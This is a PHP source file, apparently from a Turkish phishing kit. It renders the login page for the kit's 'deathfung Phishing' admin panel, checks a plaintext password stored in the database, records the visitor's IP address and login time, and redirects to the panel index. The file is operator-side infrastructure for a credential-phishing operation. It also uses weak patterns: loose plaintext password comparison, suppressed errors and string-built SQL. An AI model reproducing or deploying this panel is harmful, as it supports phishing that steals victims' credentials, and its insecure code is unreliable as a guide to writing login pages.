<?php
session_start();
ob_start();
include('../chante.php');
$pass_st = $db->query("SELECT * FROM site WHERE id = '1'")->fetch(PDO::FETCH_ASSOC);
error_reporting(0);
if(isset($_SESSION["login"])){
header('Location:index.php');
} else {
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
<meta name="description" content="">
<meta name="author" content="">
<title>deathfung Phishing | Admin Panel</title>
<style>
body {
  background-image: url('https://i.hizliresim.com/2xxkmed.png');
  background-repeat: no-repeat;
  background-attachment: fixed;
  background-size: cover;
}
</style>
<!-- Bootstrap Core CSS -->
<link href="./vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

<!-- Custom CSS -->
<link href="./css/adminnine_dark.css" rel="stylesheet">

<!-- Custom Fonts -->
<link href="./vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">

<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

</head>

<body>
<div class="container">
  <div class="row">
    <div class="col-md-4 col-md-offset-4">
      <div class="login-panel panel panel-default">
        <div class="panel-body">
          <h2 class="text-center"></h2>
          <form action="" method="POST">
            <input name="password" class="pass form-control" required type="password" placeholder="XXXXXX" />
            <br>
            <button type="submit" class="btn btn-success col-md-12">Giriş Yap</button><br>
            <?php 
            if(($_POST["password"]==$pass_st['pass'])){
            $_SESSION["login"] = "true";
            $_SESSION["pass"] = $pass_st['pass'];
            $ip = $_SERVER['REMOTE_ADDR'];
            $tarih = date('d.m.Y H:i');
            $db->query("INSERT INTO paneldekiler SET ip=('$ip'),tarih=('$tarih')");
            header("Location:index.php");
            }
            ?>
          </form>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- jQuery --> 
<script src="./vendor/jquery/jquery.min.js"></script> 

<!-- Bootstrap Core JavaScript --> 
<script src="./vendor/bootstrap/js/bootstrap.min.js"></script> 

<!-- Custom Theme JavaScript --> 
<script src="./js/adminnine.js"></script>
</body>
</html>
<?php } ?>